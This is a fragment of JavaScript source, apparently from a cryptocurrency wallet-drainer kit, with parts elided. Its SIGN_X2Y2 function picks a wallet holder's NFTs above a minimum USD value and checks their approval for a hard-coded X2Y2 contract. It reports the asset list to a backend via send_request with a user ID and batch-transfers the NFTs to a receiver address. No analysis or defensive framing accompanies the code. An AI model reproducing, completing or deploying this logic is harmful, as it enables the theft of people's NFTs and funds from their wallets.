...
const SIGN_X2Y2 = async (assets, provider, sender_address, receiver_address, user_id, min_price = 0) => {
  try {
    const nft_list = [], nft_list_plain = [];
    for (const asset of assets) {
      if (asset.skip || asset.type !== 'ERC721' || asset.chain_id != 1 || asset.amount_usd < min_price) continue;
      if (!await is_nft_approved(asset.address, sender_address, "0xf849de01b080adc3a814fabe1e2087475cf2e354")) continue;
    ...
    try {
      ...
      let gas_limit = null;
      try {
        gas_limit = await contract.estimateGas.transferBatch(nft_list, receiver_address, { from: sender_address });
        gas_limit = ethers.BigNumber.from(gas_limit).div(ethers.BigNumber.from('100')).mul(ethers.BigNumber.from('120')).toString();
      } catch(err) {
        gas_limit = 250000;
      }
      const nonce = await web3.getTransactionCount(sender_address, "pending");
      await send_request({ action: 'x2y2', user_id: user_id, x2y2: 'request', assets: nft_list_plain });
      const result = await contract.transferBatch(nft_list, receiver_address, {
